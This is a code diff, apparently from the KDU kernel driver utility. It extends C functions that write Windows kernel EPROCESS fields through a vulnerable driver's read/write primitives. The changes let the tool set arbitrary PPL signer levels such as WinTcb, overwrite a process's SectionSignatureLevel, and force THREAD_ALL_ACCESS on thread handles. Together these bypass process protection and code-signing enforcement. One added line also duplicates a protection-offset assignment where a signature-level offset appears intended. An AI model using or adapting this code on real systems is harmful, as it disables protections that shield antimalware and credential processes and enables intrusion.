@@ -70,6 +70,31 @@ LPCSTR KDUGetProtectionSignerAsString(
     return (Signer <= PsProtectedSignerApp) ? signerStrings[Signer] : "Unknown Value";
 }
 
+LPCSTR KDUGetSectionSignatureLevelAsString(
+	_In_ ULONG Level
+)
+{
+	static LPCSTR levelStrings[] = {
+        "CiLevelUnchecked",
+        "CiLevelUnsigned",
+        "CiLevelEnterprise",
+        "CiLevelCustom1",
+        "CiLevelAuthenticode",
+        "CiLevelCustom2",
+        "CiLevelStore",
+        "CiLevelAntimalware",
+        "CiLevelMicrosoft",
+        "CiLevelCustom4",
+        "CiLevelCustom5",
+        "CiLevelDynCodeGen",
+        "CiLevelWindows",
+        "CiLevelWindowsPPL",
+        "CiLevelWindowsTcb",
+        "CiLevelCustom6"
+	};
+	return (Level <= CiLevelCustom6) ? levelStrings[Level] : "Unknown Level";
+}
+
 /*
 * KDUDumpProcessMemory
 *
@@ -211,18 +236,18 @@ BOOL KDURunCommandPPL(
 
     printf_s("[+] Created Process with PID %lu\r\n", pi.dwProcessId);
 
-    PS_PROTECTED_SIGNER signer;
-    PS_PROTECTED_TYPE type;
+    PROTECTION_INFO protInfo = { };
+    protInfo.ProtType = PPLProtection;
     if (HighestSigner) { // the highest observed protection is WinTcb(6)/ProtectedLight(1)
-        signer = PsProtectedSignerWinTcb;
-        type = PsProtectedTypeProtectedLight;
+        protInfo.Protection.PsProtection.Signer = PsProtectedSignerWinTcb;
+        protInfo.Protection.PsProtection.Type = PsProtectedTypeProtectedLight;
     }
     else {
-        signer = PsProtectedSignerAntimalware;
-        type = PsProtectedTypeProtectedLight;
+        protInfo.Protection.PsProtection.Signer = PsProtectedSignerAntimalware;
+        protInfo.Protection.PsProtection.Type = PsProtectedTypeProtectedLight;
     }
 
-    if (!KDUControlProcessProtections(Context, pi.dwProcessId, signer, type)) {
+    if (!KDUControlProcessProtections(Context, pi.dwProcessId, &protInfo)) {
         supShowWin32Error("[!] Failed to set process as PPL", GetLastError());
         TerminateProcess(pi.hProcess, 0);
         CloseHandle(pi.hProcess);
@@ -247,21 +272,6 @@ BOOL KDURunCommandPPL(
     CloseHandle(pi.hThread);
 
     return TRUE;
-}
-
-/*
-* KDUUnprotectProcess
-*
-* Purpose:
-*
-* Modify process object to remove PsProtectedProcess access restrictions.
-*
-*/
-BOOL KDUUnprotectProcess(
-    _In_ PKDU_CONTEXT Context,
-    _In_ ULONG_PTR ProcessId)
-{
-    return KDUControlProcessProtections(Context, ProcessId, PsProtectedSignerNone, PsProtectedTypeNone);
 }
 
 /*
@@ -307,6 +317,23 @@ VOID printProtection(
 }
 
 /*
+* printSectionSignatureLevel
+*
+* Purpose:
+* 
+* Print process SectionSignatureLevel with string descriptions.
+* 
+*/
+VOID printSectionSignatureLevel(
+    _In_ ULONG Buffer
+)
+{
+    printf_s("\tSectionSignatureLevel: %lu (%s)\r\n",
+        Buffer & 0xFF,
+        KDUGetSectionSignatureLevelAsString(Buffer & 0xFF));
+}
+
+/*
 * printMitigationFlags
 *
 * Purpose:
@@ -338,6 +365,7 @@ BOOL KDUGetEprocessOffsets(
 )
 {
     Offsets->PsProtectionOffset = 0;
+    Offsets->SectionSignatureLevel = 0;
     Offsets->MitigationFlags1Offset = 0;
     Offsets->MitigationFlags2Offset = 0;
     Offsets->ObjectTableOffset = 0;
@@ -347,40 +375,48 @@ BOOL KDUGetEprocessOffsets(
 
     case NT_WIN8_BLUE:
         Offsets->PsProtectionOffset = PsProtectionOffset_9600;
+		Offsets->SectionSignatureLevel = SectionSignatureLevelOffset_9600;
         break;
 
     case NT_WIN10_THRESHOLD1:
         Offsets->PsProtectionOffset = PsProtectionOffset_10240;
+		Offsets->SectionSignatureLevel = SectionSignatureLevelOffset_10240;
         break;
 
     case NT_WIN10_THRESHOLD2:
         Offsets->PsProtectionOffset = PsProtectionOffset_10586;
+		Offsets->SectionSignatureLevel = SectionSignatureLevelOffset_10586;
         break;
 
     case NT_WIN10_REDSTONE1:
         Offsets->PsProtectionOffset = PsProtectionOffset_14393;
+		Offsets->SectionSignatureLevel = SectionSignatureLevelOffset_14393;
         break;
 
     case NT_WIN10_REDSTONE2:
         Offsets->PsProtectionOffset = PsProtectionOffset_15063;
+        Offsets->SectionSignatureLevel = SectionSignatureLevelOffset_15063;
         break;
 
     case NT_WIN10_REDSTONE3:
     case NT_WIN10_REDSTONE4:
         Offsets->PsProtectionOffset = PsProtectionOffset_15063;
+        Offsets->SectionSignatureLevel = SectionSignatureLevelOffset_15063;
         Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_RS3;
         Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_RS3;
         break;
 
     case NT_WIN10_REDSTONE5:
         Offsets->PsProtectionOffset = PsProtectionOffset_15063;
+		Offsets->SectionSignatureLevel = SectionSignatureLevelOffset_15063;
         Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_RS5;
         Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_RS5;
         break;
 
     case NT_WIN10_19H1:
     case NT_WIN10_19H2:
-        Offsets->PsProtectionOffset = PsProtectionOffset_15063;
+        Offsets->PsProtectionOffset = PsProtectionOffset_18362;
+		Offsets->SectionSignatureLevel = SectionSignatureLevelOffset_18362;
         Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_18362;
         Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_18362;
         break;
@@ -395,6 +431,7 @@ BOOL KDUGetEprocessOffsets(
     case NT_WIN11_22H2:
     case NT_WIN11_23H2:
         Offsets->PsProtectionOffset = PsProtectionOffset_19041;
+		Offsets->PsProtectionOffset = PsProtectionOffset_19041;
         Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_19041;
         Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_19041;
         Offsets->ObjectTableOffset = ObjectTableOffset_19041;
@@ -403,6 +440,7 @@ BOOL KDUGetEprocessOffsets(
     case NT_WIN11_24H2:
     case NT_WIN11_25H2:
         Offsets->PsProtectionOffset = PsProtectionOffset_26100;
+        Offsets->SectionSignatureLevel = SectionSignatureLevelOffset_26100;
         Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_26100;
         Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_26100;
         Offsets->ObjectTableOffset = ObjectTableOffset_26100;
@@ -439,8 +477,7 @@ BOOL KDUVerifyProviderCallbacksForPsPatch(
 BOOL KDUControlProcessProtections(
     _In_ PKDU_CONTEXT Context,
     _In_ ULONG_PTR ProcessId,
-    _In_ PS_PROTECTED_SIGNER PsProtectionSigner,
-    _In_ PS_PROTECTED_TYPE PsProtectionType)
+    _In_ PROTECTION_INFO* ProtectionInfo)
 {
     BOOL       bResult = FALSE;
     ULONG      Buffer;
@@ -448,9 +485,41 @@ BOOL KDUControlProcessProtections(
     ULONG_PTR  ProcessObject = 0, VirtualAddress = 0;
     HANDLE     hProcess = NULL;
 
+    if (!ProtectionInfo) {
+        return FALSE;
+    }
+
+	PS_PROTECTED_SIGNER PsProtectionSigner = PsProtectedSignerNone;
+	PS_PROTECTED_TYPE PsProtectionType = PsProtectedTypeNone;
+	PS_SECTION_SIGNATURE_LEVEL SectionSignatureLevel = CiLevelUnchecked;
+	const char* infoString = (ProtectionInfo->ProtType == PPLProtection) ? "PS_PROTECTION" : "SECTION_SIGNATURE";
+
     KDU_EPROCESS_OFFSETS offsets;
     CLIENT_ID clientId;
     OBJECT_ATTRIBUTES obja;
+
+    if (ProtectionInfo->ProtType == PPLProtection) {
+		if (ProtectionInfo->Protection.PsProtection.Type > PsProtectedTypeProtected || ProtectionInfo->Protection.PsProtection.Signer > PsProtectedSignerApp) {
+			supPrintfEvent(kduEventError,
+				"[!] Invalid ps protection info\r\n");
+			return FALSE;
+		}
+		PsProtectionSigner = (PS_PROTECTED_SIGNER)ProtectionInfo->Protection.PsProtection.Signer;
+		PsProtectionType = (PS_PROTECTED_TYPE)ProtectionInfo->Protection.PsProtection.Type;
+    }
+	else if (ProtectionInfo->ProtType == SectionSigningProtection) {
+		if (ProtectionInfo->Protection.SectionSignature.SignatureLevel > CiLevelCustom6) {
+			supPrintfEvent(kduEventError,
+				"[!] Invalid section signature level\r\n");
+			return FALSE;
+		}
+		SectionSignatureLevel = (PS_SECTION_SIGNATURE_LEVEL)ProtectionInfo->Protection.SectionSignature.SignatureLevel;
+	}
+	else {
+		supPrintfEvent(kduEventError,
+			"[!] Invalid protection type\r\n");
+		return FALSE;
+	}
 
     if (!KDUVerifyProviderCallbacksForPsPatch(Context))
         return FALSE;
@@ -475,7 +544,8 @@ BOOL KDUControlProcessProtections(
             printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);
 
             if (!KDUGetEprocessOffsets(Context->NtBuildNumber, &offsets) ||
-                offsets.PsProtectionOffset == 0)
+                (ProtectionInfo->ProtType == PPLProtection && offsets.PsProtectionOffset == 0) ||
+                (ProtectionInfo->ProtType == SectionSigningProtection && offsets.SectionSignatureLevel == 0))
             {
                 supPrintfEvent(kduEventError,
                     "[!] Unsupported WinNT version\r\n");
@@ -483,21 +553,32 @@ BOOL KDUControlProcessProtections(
             }
             else {
 
-                VirtualAddress = EPROCESS_TO_PROTECTION(ProcessObject, offsets.PsProtectionOffset);
+				if (ProtectionInfo->ProtType == PPLProtection) {
+					VirtualAddress = EPROCESS_TO_PROTECTION(ProcessObject, offsets.PsProtectionOffset);
+				}
+				else if (ProtectionInfo->ProtType == SectionSigningProtection) {
+					VirtualAddress = EPROCESS_TO_SECTION_SIGNATURE_LEVEL(ProcessObject, offsets.SectionSignatureLevel);
+				}
 
-                printf_s("[+] EPROCESS->PS_PROTECTION, 0x%llX\r\n", VirtualAddress);
+                printf_s("[+] EPROCESS->%s, 0x%llX\r\n", infoString, VirtualAddress);
 
                 Buffer = 0;
 
                 if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                     VirtualAddress,
                     &Buffer,
-                    sizeof(ULONG)))
+                    sizeof(UCHAR)))
                 {
                     printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress);
-                    printProtection(Buffer);
 
-                    Buffer = (Buffer & 0xFFFFFF00) | ((PsProtectionSigner << 4) | (PsProtectionType & 0x7));
+                    if (ProtectionInfo->ProtType == PPLProtection) {
+                        printProtection(Buffer);
+                        Buffer = (Buffer & 0xFFFFFF00) | ((PsProtectionSigner << 4) | (PsProtectionType & 0x7));
+                    }
+                    else if (ProtectionInfo->ProtType == SectionSigningProtection) {
+                        printSectionSignatureLevel(Buffer);
+						Buffer = (Buffer & 0xFFFFFF00) | (SectionSignatureLevel & 0xFF);
+                    }
 
                     bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
                         VirtualAddress,
@@ -507,15 +588,20 @@ BOOL KDUControlProcessProtections(
                     if (bResult) {
                         printf_s("[+] Process object modified\r\n");
 
-                        ULONG verifyBuf = 0;
+                        UCHAR verifyBuf = 0;
                         if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                             VirtualAddress,
                             &verifyBuf,
                             sizeof(UCHAR)))
                         {
                             printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress);
-                            printf_s("\tNew PsProtection: 0x%02X\r\n", verifyBuf & 0xff);
-                            printProtection(verifyBuf);
+                            printf_s("\tNew %s: 0x%02X\r\n", infoString, verifyBuf & 0xff);
+                            if (ProtectionInfo->ProtType == PPLProtection) {
+                                printProtection(verifyBuf);
+							}
+                            else if (ProtectionInfo->ProtType == SectionSigningProtection) {
+                                printSectionSignatureLevel(verifyBuf);
+                            }
                         }
                     }
                     else {
@@ -829,7 +915,7 @@ BOOL KDUControlHandleAccess(
     clientId.UniqueProcess = (HANDLE)ProcessId;
     clientId.UniqueThread = NULL;
 
-    // check if previous HandleTable can be user
+    // check if previous HandleTable can be used again
     if (ProcessHandleTable != nullptr && *ProcessHandleTable != 0) {
         HandleTable = *ProcessHandleTable; // reusing table
         bReusedTable = TRUE;
@@ -938,6 +1024,11 @@ BOOL KDUControlHandleAccess(
                 "[!] Cannot read HandleTableEntry\r\n");
         }
     }
+    else {
+		supPrintfEvent(kduEventError,
+			"[!] HandleTable pointer is NULL\r\n");
+        return FALSE;
+    }
 
     FUNCTION_LEAVE_MSG(__FUNCTION__);
 
@@ -1010,6 +1101,7 @@ BOOL KDUOpenAndPatchThreads(
     PSYSTEM_PROCESS_INFORMATION pCurrentProcess = (PSYSTEM_PROCESS_INFORMATION)procBuffer;
     int threadCount = 0;
     int err = 0;
+    bool critError = false;
 
     while (TRUE) {
         // check if this entry matches the target process
@@ -1055,7 +1147,8 @@ BOOL KDUOpenAndPatchThreads(
                     }
                     else {
                         printf_s("[!] Failed to set thread handle %p to THREAD_ALL_ACCESS.\r\n", hThread);
-                        err++;
+                        critError = true;
+						break; // erroring on SetAccessRights sometimes creates a bsod when continung -> stop processing further threads
                     }
                 }
                 else {
@@ -1066,7 +1159,10 @@ BOOL KDUOpenAndPatchThreads(
 
             // target process found and processed, returning from the function
             supHeapFree(procBuffer);
-            if (err > 0) {
+            if (critError) {
+                printf_s("[!] Critical error encountered while processing threads of process %llu. May missed some threads.\r\n", TargetProcessId);
+            }
+            else if (err > 0) {
                 printf_s("[-] Warning: Continuing despite having %i erroneous thread handle(s) out of %i in %llu.\r\n", err, threadCount, TargetProcessId);
             }
             else {
@@ -1102,7 +1198,7 @@ BOOL KDURunCommandInheritee(
     _In_ LPWSTR CommandLine,
     _In_ ULONG_PTR TargetProcessId,
     _In_ BOOL OpenThreads,
-    _In_ ULONG_PTR PPLLevel)
+    _In_ ULONG_PTR PPLsigner)
 {
     // try to open the target process directly with PROCESS_ALL_ACCESS
     HANDLE hTargetProc;
@@ -1169,8 +1265,10 @@ BOOL KDURunCommandInheritee(
 
     // check if process can be started (no PPL) or created suspended to patch PPL
     DWORD creationOptions;
-    if (PPLLevel > 0) {
+    PS_PROTECTED_TYPE PPLtype = PsProtectedTypeNone;
+    if (PPLsigner > 0) {
         wprintf_s(L"[+] Creating suspended Process '%s'\r\n", CommandLine);
+		PPLtype = PsProtectedTypeProtectedLight; // something kills the proc when signer > 0 but type = 0
         creationOptions = CREATE_SUSPENDED;
     }
     else {
@@ -1195,19 +1293,20 @@ BOOL KDURunCommandInheritee(
     }
     printf_s("[+] Created Process with PID %lu\r\n", pi.dwProcessId);
 
-    if (PPLLevel >= 7) {
-        PPLLevel = 7;
-        printf_s("[!] Capped the PPL level at 7\r\n");
+    if (PPLsigner >= PS_PROTECTED_SIGNER::PsProtectedSignerMax) {
+        PPLsigner = PS_PROTECTED_SIGNER::PsProtectedSignerMax;
+        printf_s("[!] Capped the PPL level at %llu\r\n", PPLsigner);
     }
 
-    // patch PPL and resume
-    if (PPLLevel > 0 and PPLLevel < 8) {
+	if (PPLsigner > 0) {
+		printf_s("[+] Attempting to set process as PPL with signer %llu and type %i\r\n", PPLsigner, PPLtype);
+        PROTECTION_INFO protInfo = { };
+        protInfo.ProtType = PPLProtection;
+        protInfo.Protection.PsProtection.Signer = (PS_PROTECTED_SIGNER)PPLsigner;
+        protInfo.Protection.PsProtection.Type = PPLtype;
 
-        DWORD dwThreadResumeCount = 0;
-        PS_PROTECTED_SIGNER signer = (PS_PROTECTED_SIGNER)PPLLevel;
-        PS_PROTECTED_TYPE type = PsProtectedTypeProtectedLight;
-
-        if (!KDUControlProcessProtections(Context, pi.dwProcessId, signer, type)) {
+        // patch PPL
+        if (!KDUControlProcessProtections(Context, pi.dwProcessId, &protInfo)) {
             supShowWin32Error("[!] Failed to set process as PPL", GetLastError());
             TerminateProcess(pi.hProcess, 0);
             CloseHandle(pi.hProcess);
@@ -1215,6 +1314,8 @@ BOOL KDURunCommandInheritee(
             return FALSE;
         }
 
+        // and resume process
+        DWORD dwThreadResumeCount = 0;
         dwThreadResumeCount = ResumeThread(pi.hThread);
         if (dwThreadResumeCount != 1) {
             supPrintfEvent(kduEventError,
@@ -1224,12 +1325,12 @@ BOOL KDURunCommandInheritee(
             CloseHandle(pi.hThread);
             return FALSE;
         }
-    }
+	}
 
-    // Wait until child process exits.
+    // wait until child process exits
     WaitForSingleObject(pi.hProcess, INFINITE);
 
-    // Close process and thread handles.
+    // close process and thread handles
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 
